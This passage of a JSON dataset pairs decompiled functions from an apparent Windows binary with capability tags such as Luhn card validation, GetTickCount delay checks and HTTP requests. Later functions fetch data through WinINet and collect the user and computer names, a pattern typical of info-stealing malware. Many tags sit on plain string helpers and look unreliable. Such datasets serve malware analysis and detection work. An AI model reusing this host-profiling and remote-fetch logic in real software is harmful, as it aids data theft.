        "decompiled_code": "\nvoid __fastcall fcn.0040724e(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040b326(0x4049cc);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.0040b9a0(puVar4 + param_1, puVar2 + in_EAX + param_1, uVar3 - in_EAX);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX)) = 0;\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "004073be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004073be(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.00405c90(1);\n        if (unaff_EBX[5] < 0x10) {\n            fcn.0040b9a0(in_EAX, unaff_EBX, unaff_EBX[4] + 1);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00407403": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407403(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t arg_10h;\n    \n    uVar2 = in_EAX[4];\n    uVar3 = arg_8h;\n    if (uVar2 < arg_8h) {\n        uVar2 = fcn.0040b326(0x4049cc);\n        uVar3 = extraout_ECX;\n    }\n    arg_10h = uVar2 - uVar3;\n    if (arg_ch < uVar2 - uVar3) {\n        arg_10h = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.0040724e();\n        fcn.0040724e();\n    }\n    else {\n        cVar1 = fcn.0040761d(0);\n        if (cVar1 != '\\0') {\n            if (0xf < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.0040b3b0(arg_8h_00, in_EAX + arg_8h, arg_10h);\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "00407492": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407492(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.00407574(1);\n        if (unaff_EBX[5] < 8) {\n            fcn.0040b9a0(in_EAX, unaff_EBX, unaff_EBX[4] * 2 + 2);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "004074da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004074da(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    \n    uVar3 = in_EAX[4];\n    uVar2 = arg_8h;\n    if (uVar3 < arg_8h) {\n        uVar2 = fcn.0040b326(0x4049cc);\n    }\n    uVar3 = uVar3 - uVar2;\n    if (arg_ch < uVar3) {\n        uVar3 = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.004076ff();\n        fcn.004076ff();\n    }\n    else {\n        cVar1 = fcn.00407770(0);\n        if (cVar1 != '\\0') {\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (7 < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.0040b3b0(arg_8h_00, in_EAX + arg_8h * 2, uVar3 * 2);\n            in_ECX[4] = uVar3;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(uVar3 * 2 + in_ECX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004075b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004075b4(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    \n    cVar1 = fcn.004078c1(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.0040761d(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.0040b3b0(arg_8h, param_1, in_EAX);\n            unaff_ESI[4] = in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + in_EAX) = 0;\n        }\n    }\n    else {\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.00407403(param_1 - unaff_ESI, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00407684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407684(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    cVar1 = fcn.004079ea(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00407770(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.0040b3b0(arg_8h, param_1, in_EAX * 2);\n            unaff_ESI[4] = in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(in_EAX * 2 + unaff_ESI) = 0;\n        }\n    }\n    else {\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.004074da(param_1 - unaff_ESI >> 1, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "004076ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004076ff(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040b326(0x4049cc);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (7 < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.0040b9a0(puVar4 + param_1 * 2, puVar2 + (param_1 + in_EAX) * 2, (uVar3 - in_EAX) * 2);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004078d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004078d3(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint in_ECX;\n    uint *puVar1;\n    uint32_t in_EDX;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    \n    if (!CARRY1(in_ECX, *((unaff_EBX & 0xffffff00 | unaff_EBX | in_ECX >> 8) + 0x84d39c8))) {\n        puVar1 = in_EAX;\n        if (0xf < in_EDX) {\n            puVar1 = *in_EAX;\n        }\n        in_EAX = in_EAX[4] + puVar1;\n        if (*(unaff_EBP + 8) <= in_EAX && in_EAX != *(unaff_EBP + 8)) {\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 219
    },
    "00407ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ab8(uint arg_8h)\n\n{\n    uint in_EAX;\n    ushort *in_ECX;\n    \n    *(in_ECX + 8) = 0;\n    *(in_ECX + 10) = 7;\n    *in_ECX = 0;\n    fcn.0040d2eb(arg_8h);\n    fcn.00407c54();\n    fcn.00407ea6(in_EAX, 0);\n    fcn.0040d2eb(arg_8h);\n    fcn.00407f43(arg_8h);\n    return;\n}\n",
        "token_count": 136
    },
    "00407c89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c89(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040b326(0x4049cc);\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.0040b2d9(0x4049e4);\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.0040761d(0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.0040b3b0(unaff_ESI[4] + puVar4, arg_8h + arg_ch, in_EAX);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar3 + in_EAX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00407d1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d1d(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.004078c1(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b2d9(0x4049e4);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.0040761d(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.0040b3b0(in_EAX[4] + puVar3, arg_8h, unaff_EDI);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2 + unaff_EDI) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.00407c89(in_EAX, arg_8h - puVar3);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "00407dad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407dad(uint *arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *unaff_ESI;\n    \n    if (arg_ch <= arg_8h[4]) {\n        uVar3 = arg_8h[4] - arg_ch;\n        if (uVar3 < in_EAX) {\n            in_EAX = uVar3;\n        }\n        iVar4 = unaff_ESI[4];\n        if (-iVar4 - 1U <= in_EAX) {\n            iVar4 = fcn.0040b2d9(0x4049e4);\n        }\n        if (in_EAX != 0) {\n            cVar2 = fcn.0040761d(0);\n            if (cVar2 != '\\0') {\n                puVar5 = unaff_ESI;\n                puVar6 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar5 = *unaff_ESI;\n                    puVar6 = *unaff_ESI;\n                }\n                fcn.0040b9a0(puVar5 + in_EAX, puVar6, unaff_ESI[4]);\n                if (unaff_ESI == arg_8h) {\n                    uVar3 = arg_ch + in_EAX;\n                    if (arg_ch == 0) {\n                        uVar3 = arg_ch;\n                    }\n                    puVar5 = unaff_ESI;\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar5 = *unaff_ESI;\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.0040b9a0(puVar5, puVar6 + uVar3, in_EAX);\n                }\n                else {\n                    if (0xf < arg_8h[5]) {\n                        arg_8h = *arg_8h;\n                    }\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.0040b3b0(puVar6, arg_8h + arg_ch, in_EAX);\n                }\n                unaff_ESI[4] = iVar4 + in_EAX;\n                if (0xf < unaff_ESI[5]) {\n                    unaff_ESI = *unaff_ESI;\n                }\n                *(unaff_ESI + iVar4 + in_EAX) = 0;\n            }\n        }\n        return;\n    }\n    fcn.0040b326(0x4049cc);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 646
    },
    "00407ea6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ea6(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040b326(0x4049cc);\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.0040b2d9(0x4049e4);\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.00407770(0);\n        if (cVar1 != '\\0') {\n            if (7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.0040b3b0(puVar4 + unaff_ESI[4] * 2, arg_8h + arg_ch * 2, in_EAX * 2);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + (iVar3 + in_EAX) * 2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "00407f43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f43(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.004079ea(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b2d9(0x4049e4);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.00407770(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (7 < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.0040b3b0(puVar3 + in_EAX[4] * 2, arg_8h, unaff_EDI * 2);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (7 < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + (iVar2 + unaff_EDI) * 2) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.00407ea6(in_EAX, arg_8h - puVar3 >> 1);\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "00407fdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407fdb(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = fcn.0040d260(arg_8h);\n    uVar1 = in_EAX[4];\n    uVar3 = uVar1;\n    if (uVar2 <= uVar1) {\n        uVar3 = uVar2;\n    }\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    uVar3 = fcn.0040bd01(in_EAX, arg_8h, uVar3);\n    if (uVar3 == 0) {\n        if (uVar1 < uVar2) {\n            uVar3 = 0xffffffff;\n        }\n        else {\n            uVar3 = uVar1 != uVar2;\n        }\n    }\n    return uVar3 & 0xffffff00 | uVar3 == 0;\n}\n",
        "token_count": 234
    },
    "004082ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004082ae(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    uint32_t *unaff_EDI;\n    \n    uVar1 = unaff_EDI[1];\n    if ((in_EAX < uVar1) && (uVar2 = *unaff_EDI,  uVar2 <= in_EAX)) {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.00408398();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x004082fc;\n        in_EAX = ((in_EAX - uVar2) / 0x1c) * 0x1c + *unaff_EDI;\n    }\n    else {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.00408398();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x004082fc;\n    }\n    fcn.004071e6(in_EAX);\ncode_r0x004082fc:\n    unaff_EDI[1] = unaff_EDI[1] + 0x1c;\n    return;\n}\n",
        "token_count": 275
    },
    "00408303": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408303(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t *unaff_ESI;\n    \n    puVar2 = unaff_ESI[1];\n    if ((in_EAX < puVar2) && (puVar1 = *unaff_ESI,  puVar1 <= in_EAX)) {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.004083ef();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x00408349;\n        uVar3 = *(*unaff_ESI + (in_EAX - puVar1 >> 2) * 4);\n    }\n    else {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.004083ef();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x00408349;\n        uVar3 = *in_EAX;\n    }\n    *puVar2 = uVar3;\ncode_r0x00408349:\n    unaff_ESI[1] = unaff_ESI[1] + 4;\n    return;\n}\n",
        "token_count": 290
    },
    "00408472": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00408472(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00411c3c(0x14);\n    uVar4 = *(unaff_EBP + 8);\n    if (0x9249249 < uVar4) {\n        fcn.0040b2d9(0x404a14);\n    }\n    if ((extraout_ECX[2] - *extraout_ECX) / 0x1c < uVar4) {\n        uVar2 = fcn.004085e1();\n        *(unaff_EBP + -0x18) = uVar2;\n        *(unaff_EBP + -4) = 0;\n        fcn.00408675(*extraout_ECX, extraout_ECX[1], *(unaff_EBP + -0x18));\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar3 = extraout_ECX[1];\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar1 = *extraout_ECX;\n        iVar3 = (iVar3 - iVar1) / 0x1c;\n        *(unaff_EBP + -0x20) = iVar3;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -0x14) = iVar1;\n            if (iVar1 != *(unaff_EBP + -0x1c)) {\n                do {\n                    fcn.00405c90(1);\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x1c;\n                } while (*(unaff_EBP + -0x14) != *(unaff_EBP + -0x1c));\n                uVar4 = *(unaff_EBP + 8);\n                iVar3 = *(unaff_EBP + -0x20);\n            }\n            fcn.0040b84b(*extraout_ECX);\n        }\n        iVar1 = *(unaff_EBP + -0x18);\n        extraout_ECX[2] = uVar4 * 0x1c + iVar1;\n        extraout_ECX[1] = iVar3 * 0x1c + iVar1;\n        *extraout_ECX = iVar1;\n    }\n    fcn.00411c72();\n    return;\n}\n",
        "token_count": 632
    },
    "00408675": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408675(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00411c3c(8);\n    iVar2 = *(unaff_EBP + 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 0;\n    while (iVar1 != *(unaff_EBP + 0xc)) {\n        if (iVar2 != 0) {\n            fcn.00407236();\n        }\n        iVar2 = iVar2 + 0x1c;\n        *(unaff_EBP + 0x10) = iVar2;\n        iVar1 = iVar1 + 0x1c;\n        *(unaff_EBP + 8) = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411c72();\n    return;\n}\n",
        "token_count": 258
    },
    "004086d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.004086d6(void)\n\n{\n    uint *puVar1;\n    uchar *unaff_EBX;\n    uint uVar2;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_64h = (*_sym.imp.WININET.dll_InternetOpenA)(0x404a38, 0, 0, 0, 0);\n    uVar2 = 0x404a40;\n    fcn.0040720a(0x404a40);\n    puVar1 = fcn.0040aeb4(&var_60h, uVar2, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, in_stack_ffffff64, \n                          in_stack_ffffff68);\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar2 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_64h, puVar1, 0, 0, 0x80000000, 0);\n    fcn.00405c90(1);\n    puVar1 = &var_44h;\n    (*_sym.imp.WININET.dll_InternetReadFile)(uVar2, puVar1, 0x40, &var_68h);\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(var_64h);\n    *(unaff_EBX + 0x10) = 0;\n    *(unaff_EBX + 0x14) = 0xf;\n    *unaff_EBX = 0;\n    fcn.004075b4();\n    fcn.0040b39f(puVar1);\n    return;\n}\n",
        "token_count": 470
    },
    "00408786": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.00408786(void)\n\n{\n    uchar *unaff_EBX;\n    uint uVar1;\n    uint *arg_8h;\n    uint arg_ch;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint uVar2;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_68h;\n    uint var_4ch;\n    uint *var_30h;\n    uint32_t var_1ch;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_88h = (*_sym.imp.WININET.dll_InternetOpenA)(0x404a38, 0, 0, 0, 0);\n    arg_ch = 0x404a60;\n    fcn.0040720a(0x404a60);\n    arg_8h = &var_84h;\n    fcn.0040aeb4(arg_8h, arg_ch, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, in_stack_ffffff44, \n                 in_stack_ffffff48);\n    uVar2 = 0x401ef4;\n    uVar1 = 0x404a74;\n    fcn.0040720a(0x404a74);\n    fcn.0040aeb4(&var_68h, uVar1, arg_8h, arg_ch, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40);\n    fcn.00407b7e(&var_4ch, in_stack_ffffff48);\n    fcn.00407b3a(uVar2);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    if (var_1ch < 0x10) {\n        var_30h = &var_30h;\n    }\n    uVar1 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_88h, var_30h, 0, 0, 0x80000000, 0);\n    (*_sym.imp.WININET.dll_InternetReadFile)(uVar1, &var_14h, 0x10, &var_8ch);\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(var_88h);\n    *(unaff_EBX + 0x10) = 0;\n    *(unaff_EBX + 0x14) = 0xf;\n    *unaff_EBX = 0;\n    fcn.004075b4();\n    fcn.00405c90(1);\n    fcn.0040b39f(uVar1);\n    return;\n}\n",
        "token_count": 656
    },
    "004089d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004089d2(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint noname_2;\n    uint arg_ch;\n    uint in_stack_fffffdb8;\n    uint in_stack_fffffdbc;\n    uint in_stack_fffffdc0;\n    uint in_stack_fffffdc4;\n    uint arg_ch_00;\n    uint in_stack_fffffdc8;\n    uint uVar4;\n    uint pcbBuffer;\n    uint lpHwProfileInfo;\n    uint var_1ech;\n    uint var_174h;\n    uint var_158h;\n    uint var_13ch;\n    uint *var_120h;\n    int32_t var_110h;\n    uint32_t var_10ch;\n    uint lpBuffer;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    fcn.004086d6();\n    fcn.004073be();\n    fcn.00405c90(1);\n    fcn.00408786();\n    fcn.004073be();\n    fcn.00405c90(1);\n    pcbBuffer = 0x100;\n    (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&fcn.004089d2::lpBuffer, &fcn.004089d2::pcbBuffer);\n    fcn.0040d260(&fcn.004089d2::lpBuffer);\n    fcn.004075b4();\n    pcbBuffer = 0x100;\n    (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&fcn.004089d2::lpBuffer, &fcn.004089d2::pcbBuffer);\n    fcn.0040d260(&fcn.004089d2::lpBuffer);\n    fcn.004075b4();\n    fcn.004088aa();\n    iVar1 = 